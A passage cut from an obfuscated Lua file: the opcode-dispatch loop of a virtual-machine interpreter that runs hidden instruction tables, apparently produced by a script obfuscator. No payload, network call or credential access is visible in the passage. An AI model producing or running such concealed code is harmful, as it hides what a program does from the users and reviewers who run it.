                Stk[A](Unpack(Stk, A + 1, Inst[3]));
              else
                local B;
                local A;
                Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Inst[3];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Inst[3];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Inst[3];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                Stk[A] = Stk[A](Unpack(Stk, A + 1, Inst[3]));
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]][Inst[3]] = Stk[Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                B = Stk[Inst[3]];
                Stk[A + 1] = B;
                Stk[A] = B[Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = {};
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]][Inst[3]] = Inst[4];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]][Inst[3]] = Inst[4];
              end
            elseif (Enum <= 290) then
              local Edx;
              local Results, Limit;
              local B;
              local A;
              if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                Stk[Inst[2]] = Env;
              else
                Stk[Inst[2]] = Env[Inst[3]];
              end
              VIP = VIP + 1;
              Inst = Instr[VIP];
              if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                Stk[Inst[2]] = Env;
              else
                Stk[Inst[2]] = Env[Inst[3]];
              end
              VIP = VIP + 1;
              Inst = Instr[VIP];
              A = Inst[2];
              B = Stk[Inst[3]];
              Stk[A + 1] = B;
              Stk[A] = B[Inst[4]];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]] = Inst[3];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              A = Inst[2];
              Results, Limit = _R(Stk[A](Unpack(Stk, A + 1, Inst[3])));
              Top = (Limit + A) - 1;
              Edx = 0;
              for Idx = A, Top do
                Edx = Edx + 1;
                Stk[Idx] = Results[Edx];
              end
              VIP = VIP + 1;
              Inst = Instr[VIP];
              A = Inst[2];
              Stk[A] = Stk[A](Unpack(Stk, A + 1, Top));
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]]();
              VIP = VIP + 1;
              Inst = Instr[VIP];
              do
                return;
              end
            elseif (Enum == 291) then
              local Edx;
              local Results, Limit;
              local B;
              local A;
              if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                Stk[Inst[2]] = Env;
              else
                Stk[Inst[2]] = Env[Inst[3]];
              end
              VIP = VIP + 1;
              Inst = Instr[VIP];
              if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                Stk[Inst[2]] = Env;
              else
                Stk[Inst[2]] = Env[Inst[3]];
              end
              VIP = VIP + 1;
              Inst = Instr[VIP];
              A = Inst[2];
              B = Stk[Inst[3]];
              Stk[A + 1] = B;
              Stk[A] = B[Inst[4]];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]] = Inst[3];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              A = Inst[2];
              Results, Limit = _R(Stk[A](Unpack(Stk, A + 1, Inst[3])));
              Top = (Limit + A) - 1;
              Edx = 0;
              for Idx = A, Top do
                Edx = Edx + 1;
                Stk[Idx] = Results[Edx];
              end
              VIP = VIP + 1;
              Inst = Instr[VIP];
              A = Inst[2];
              Stk[A] = Stk[A](Unpack(Stk, A + 1, Top));
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]]();
              VIP = VIP + 1;
              Inst = Instr[VIP];
              do
                return;
              end
            else
              Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                Stk[Inst[2]] = Env;
              else
                Stk[Inst[2]] = Env[Inst[3]];
              end
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]][Inst[3]] = Inst[4];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]][Inst[3]] = Inst[4];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]][Inst[3]] = Inst[4];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]][Inst[3]] = Inst[4];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]][Inst[3]] = Inst[4];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]][Inst[3]] = Inst[4];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]][Inst[3]] = Inst[4];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                Stk[Inst[2]] = Env;
              else
                Stk[Inst[2]] = Env[Inst[3]];
              end
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]][Inst[3]] = Inst[4];
            end
          elseif (Enum <= 295) then
            if (Enum <= 293) then
              if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                Stk[Inst[2]] = Env;
              else
                Stk[Inst[2]] = Env[Inst[3]];
              end
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]][Inst[3]] = Stk[Inst[4]];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              do
                return;
              end
            elseif (Enum == 294) then
              local B;
              local A;
              A = Inst[2];
              Stk[A](Unpack(Stk, A + 1, Inst[3]));
              VIP = VIP + 1;
              Inst = Instr[VIP];
              A = Inst[2];
              B = Stk[Inst[3]];
              Stk[A + 1] = B;
              Stk[A] = B[Inst[4]];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]] = Inst[3];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              A = Inst[2];
              Stk[A](Unpack(Stk, A + 1, Inst[3]));
              VIP = VIP + 1;
              Inst = Instr[VIP];
              A = Inst[2];
              B = Stk[Inst[3]];
              Stk[A + 1] = B;
              Stk[A] = B[Inst[4]];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]] = Inst[3];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]] = Inst[3];
            else
              local Edx;
              local Results, Limit;
              local B;
              local A;
              if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                Stk[Inst[2]] = Env;
              else
                Stk[Inst[2]] = Env[Inst[3]];
              end
              VIP = VIP + 1;
              Inst = Instr[VIP];
              if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                Stk[Inst[2]] = Env;
              else
                Stk[Inst[2]] = Env[Inst[3]];
              end
              VIP = VIP + 1;
              Inst = Instr[VIP];
              A = Inst[2];
              B = Stk[Inst[3]];
              Stk[A + 1] = B;
              Stk[A] = B[Inst[4]];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]] = Inst[3];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]] = Inst[3] ~= 0;
              VIP = VIP + 1;
              Inst = Instr[VIP];
              A = Inst[2];
              Results, Limit = _R(Stk[A](Unpack(Stk, A + 1, Inst[3])));
              Top = (Limit + A) - 1;
              Edx = 0;
              for Idx = A, Top do
                Edx = Edx + 1;
                Stk[Idx] = Results[Edx];
              end
              VIP = VIP + 1;
              Inst = Instr[VIP];
              A = Inst[2];
              Stk[A] = Stk[A](Unpack(Stk, A + 1, Top));
              VIP = VIP + 1;
              Inst = Instr[VIP];
              A = Inst[2];
              Stk[A] = Stk[A]();
              VIP = VIP + 1;
              Inst = Instr[VIP];
              if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                Stk[Inst[2]] = Env;
              else
                Stk[Inst[2]] = Env[Inst[3]];
              end
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]] = Inst[3];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]] = Inst[3];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]] = Inst[3];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              A = Inst[2];
              Stk[A] = Stk[A](Unpack(Stk, A + 1, Inst[3]));
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]][Inst[3]] = Stk[Inst[4]];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              A = Inst[2];
              B = Stk[Inst[3]];
              Stk[A + 1] = B;
              Stk[A] = B[Inst[4]];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]] = {};
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]][Inst[3]] = Inst[4];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]][Inst[3]] = Inst[4];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              A = Inst[2];
              Stk[A](Unpack(Stk, A + 1, Inst[3]));
              VIP = VIP + 1;
              Inst = Instr[VIP];
              if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                Stk[Inst[2]] = Env;
              else
                Stk[Inst[2]] = Env[Inst[3]];
              end
              VIP = VIP + 1;
              Inst = Instr[VIP];
              if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                Stk[Inst[2]] = Env;
              else
                Stk[Inst[2]] = Env[Inst[3]];
              end
              VIP = VIP + 1;
              Inst = Instr[VIP];
              A = Inst[2];
              B = Stk[Inst[3]];
              Stk[A + 1] = B;
              Stk[A] = B[Inst[4]];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]] = Inst[3];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              A = Inst[2];
              Stk[A] = Stk[A](Unpack(Stk, A + 1, Inst[3]));
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              A = Inst[2];
              Stk[A] = Stk[A](Stk[A + 1]);
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]]();
              VIP = VIP + 1;
              Inst = Instr[VIP];
              do
                return;
              end
            end
          elseif (Enum <= 297) then
            if (Enum == 296) then
              local B;
              local A;
              if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                Stk[Inst[2]] = Env;
              else
                Stk[Inst[2]] = Env[Inst[3]];
              end
              VIP = VIP + 1;
              Inst = Instr[VIP];
              A = Inst[2];
              B = Stk[Inst[3]];
              Stk[A + 1] = B;
              Stk[A] = B[Inst[4]];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]] = Inst[3];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              A = Inst[2];
              Stk[A] = Stk[A](Unpack(Stk, A + 1, Inst[3]));
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              A = Inst[2];
              B = Stk[Inst[3]];
              Stk[A + 1] = B;
              Stk[A] = B[Inst[4]];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]] = Inst[3];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                Stk[Inst[2]] = Env;
              else
                Stk[Inst[2]] = Env[Inst[3]];
              end
              VIP = VIP + 1;
              Inst = Instr[VIP];
              A = Inst[2];
              Stk[A](Unpack(Stk, A + 1, Inst[3]));
            else
              local A = Inst[2];
              Stk[A](Unpack(Stk, A + 1, Top));
            end
          elseif (Enum == 298) then
            local A;
            Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
            VIP = VIP + 1;
            Inst = Instr[VIP];
            Stk[Inst[2]] = Stk[Inst[3]] / Inst[4];
            VIP = VIP + 1;
            Inst = Instr[VIP];
            if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
              Stk[Inst[2]] = Env;
            else
              Stk[Inst[2]] = Env[Inst[3]];
            end
            VIP = VIP + 1;
            Inst = Instr[VIP];
            Stk[Inst[2]] = Inst[3];
            VIP = VIP + 1;
            Inst = Instr[VIP];
            A = Inst[2];
            Stk[A] = Stk[A](Unpack(Stk, A + 1, Inst[3]));
            VIP = VIP + 1;
            Inst = Instr[VIP];
            Env[Inst[3]] = Stk[Inst[2]];
            VIP = VIP + 1;
            Inst = Instr[VIP];
            if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
              Stk[Inst[2]] = Env;
            else
              Stk[Inst[2]] = Env[Inst[3]];
            end
            VIP = VIP + 1;
            Inst = Instr[VIP];
            Stk[Inst[2]]();
          else
            Stk[Inst[2]] = Stk[Inst[3]] + Stk[Inst[4]];
          end
        elseif (Enum <= 349) then
          if (Enum <= 324) then
            if (Enum <= 311) then
              if (Enum <= 305) then
                if (Enum <= 302) then
                  if (Enum <= 300) then
                    local Edx;
                    local Results, Limit;
                    local B;
                    local A;
                    A = Inst[2];
                    B = Stk[Inst[3]];
                    Stk[A + 1] = B;
                    Stk[A] = B[Inst[4]];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Stk[Inst[2]] = Inst[3];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    A = Inst[2];
                    B = Stk[Inst[3]];
                    Stk[A + 1] = B;
                    Stk[A] = B[Inst[4]];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Stk[Inst[2]] = Stk[Inst[3]];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Stk[Inst[2]] = Inst[3];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    A = Inst[2];
                    Stk[A] = Stk[A](Unpack(Stk, A + 1, Inst[3]));
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                      Stk[Inst[2]] = Env;
                    else
                      Stk[Inst[2]] = Env[Inst[3]];
                    end
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    A = Inst[2];
                    Results, Limit = _R(Stk[A](Stk[A + 1]));
                    Top = (Limit + A) - 1;
                    Edx = 0;
                    for Idx = A, Top do
                      Edx = Edx + 1;
                      Stk[Idx] = Results[Edx];
                    end
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    A = Inst[2];
                    Stk[A](Unpack(Stk, A + 1, Top));
                  elseif (Enum > 301) then
                    local Edx;
                    local Results, Limit;
                    local B;
                    local A;
                    if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                      Stk[Inst[2]] = Env;
                    else
                      Stk[Inst[2]] = Env[Inst[3]];
                    end
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                      Stk[Inst[2]] = Env;
                    else
                      Stk[Inst[2]] = Env[Inst[3]];
                    end
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    A = Inst[2];
                    B = Stk[Inst[3]];
                    Stk[A + 1] = B;
                    Stk[A] = B[Inst[4]];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Stk[Inst[2]] = Inst[3];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    A = Inst[2];
                    Results, Limit = _R(Stk[A](Unpack(Stk, A + 1, Inst[3])));
                    Top = (Limit + A) - 1;
                    Edx = 0;
                    for Idx = A, Top do
                      Edx = Edx + 1;
                      Stk[Idx] = Results[Edx];
                    end
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    A = Inst[2];
                    Stk[A] = Stk[A](Unpack(Stk, A + 1, Top));
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Stk[Inst[2]]();
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    do
                      return;
                    end
                  else
                    local B;
                    local A;
                    Upvalues[Inst[3]] = Stk[Inst[2]];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Stk[Inst[2]] = Upvalues[Inst[3]];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    A = Inst[2];
                    B = Stk[Inst[3]];
                    Stk[A + 1] = B;
                    Stk[A] = B[Inst[4]];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Stk[Inst[2]] = Inst[3];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    A = Inst[2];
                    Stk[A](Unpack(Stk, A + 1, Inst[3]));
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Stk[Inst[2]] = Upvalues[Inst[3]];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                      Stk[Inst[2]] = Env;
                    else
                      Stk[Inst[2]] = Env[Inst[3]];
                    end
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Stk[Inst[2]][Inst[3]] = Stk[Inst[4]];
                  end
                elseif (Enum <= 303) then
                  local Edx;
                  local Results, Limit;
                  local B;
                  local A;
                  if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                    Stk[Inst[2]] = Env;
                  else
                    Stk[Inst[2]] = Env[Inst[3]];
                  end
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                    Stk[Inst[2]] = Env;
                  else
                    Stk[Inst[2]] = Env[Inst[3]];
                  end
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  B = Stk[Inst[3]];
                  Stk[A + 1] = B;
                  Stk[A] = B[Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Inst[3];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  Results, Limit = _R(Stk[A](Unpack(Stk, A + 1, Inst[3])));
                  Top = (Limit + A) - 1;
                  Edx = 0;
                  for Idx = A, Top do
                    Edx = Edx + 1;
                    Stk[Idx] = Results[Edx];
                  end
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  Stk[A] = Stk[A](Unpack(Stk, A + 1, Top));
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]]();
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  do
                    return;
                  end
                elseif (Enum > 304) then
                  local Edx;
                  local Results, Limit;
                  local B;
                  local A;
                  if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                    Stk[Inst[2]] = Env;
                  else
                    Stk[Inst[2]] = Env[Inst[3]];
                  end
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                    Stk[Inst[2]] = Env;
                  else
                    Stk[Inst[2]] = Env[Inst[3]];
                  end
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  B = Stk[Inst[3]];
                  Stk[A + 1] = B;
                  Stk[A] = B[Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Inst[3];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  Results, Limit = _R(Stk[A](Unpack(Stk, A + 1, Inst[3])));
                  Top = (Limit + A) - 1;
                  Edx = 0;
                  for Idx = A, Top do
                    Edx = Edx + 1;
                    Stk[Idx] = Results[Edx];
                  end
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  Stk[A] = Stk[A](Unpack(Stk, A + 1, Top));
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]]();
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  do
                    return;
                  end
                else
                  local B;
                  local A;
                  if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                    Stk[Inst[2]] = Env;
                  else
                    Stk[Inst[2]] = Env[Inst[3]];
                  end
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  B = Stk[Inst[3]];
                  Stk[A + 1] = B;
                  Stk[A] = B[Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Inst[3];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  Stk[A] = Stk[A](Unpack(Stk, A + 1, Inst[3]));
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                    Stk[Inst[2]] = Env;
                  else
                    Stk[Inst[2]] = Env[Inst[3]];
                  end
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  B = Stk[Inst[3]];
                  Stk[A + 1] = B;
                  Stk[A] = B[Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Inst[3];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  Stk[A] = Stk[A](Unpack(Stk, A + 1, Inst[3]));
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                end
              elseif (Enum <= 308) then
                if (Enum <= 306) then
                  for Idx = Inst[2], Inst[3] do
                    Stk[Idx] = nil;
                  end
                elseif (Enum == 307) then
                  local A = Inst[2];
                  local Step = Stk[A + 2];
                  local Index = Stk[A] + Step;
                  Stk[A] = Index;
                  if (Step > 0) then
                    if (Index <= Stk[A + 1]) then
                      VIP = Inst[3];
                      Stk[A + 3] = Index;
                    end
                  elseif (Index >= Stk[A + 1]) then
                    VIP = Inst[3];
                    Stk[A + 3] = Index;
                  end
                else
                  local B;
                  local A;
                  A = Inst[2];
                  Stk[A](Unpack(Stk, A + 1, Inst[3]));
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  B = Stk[Inst[3]];
                  Stk[A + 1] = B;
                  Stk[A] = B[Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Inst[3];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  Stk[A](Unpack(Stk, A + 1, Inst[3]));
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  B = Stk[Inst[3]];
                  Stk[A + 1] = B;
                  Stk[A] = B[Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Inst[3];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Inst[3];
                end
              elseif (Enum <= 309) then
                local B;
                local A;
                Env[Inst[3]] = Stk[Inst[2]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                B = Stk[Inst[3]];
                Stk[A + 1] = B;
                Stk[A] = B[Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Inst[3];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Inst[3];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                  Stk[Inst[2]] = Env;
                else
                  Stk[Inst[2]] = Env[Inst[3]];
                end
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                Stk[A](Unpack(Stk, A + 1, Inst[3]));
                VIP = VIP + 1;
                Inst = Instr[VIP];
                if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                  Stk[Inst[2]] = Env;
                else
                  Stk[Inst[2]] = Env[Inst[3]];
                end
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                B = Stk[Inst[3]];
                Stk[A + 1] = B;
                Stk[A] = B[Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Inst[3];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                Stk[A] = Stk[A](Unpack(Stk, A + 1, Inst[3]));
              elseif (Enum > 310) then
                local B;
                local A;
                A = Inst[2];
                Stk[A](Unpack(Stk, A + 1, Inst[3]));
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                B = Stk[Inst[3]];
                Stk[A + 1] = B;
                Stk[A] = B[Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Inst[3];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                Stk[A](Unpack(Stk, A + 1, Inst[3]));
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                B = Stk[Inst[3]];
                Stk[A + 1] = B;
                Stk[A] = B[Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Inst[3];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Inst[3];
              else
                local Edx;
                local Results, Limit;
                local B;
                local A;
                if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                  Stk[Inst[2]] = Env;
                else
                  Stk[Inst[2]] = Env[Inst[3]];
                end
                VIP = VIP + 1;
                Inst = Instr[VIP];
                if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                  Stk[Inst[2]] = Env;
                else
                  Stk[Inst[2]] = Env[Inst[3]];
                end
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                B = Stk[Inst[3]];
                Stk[A + 1] = B;
                Stk[A] = B[Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Inst[3];
                VIP = VIP + 1;
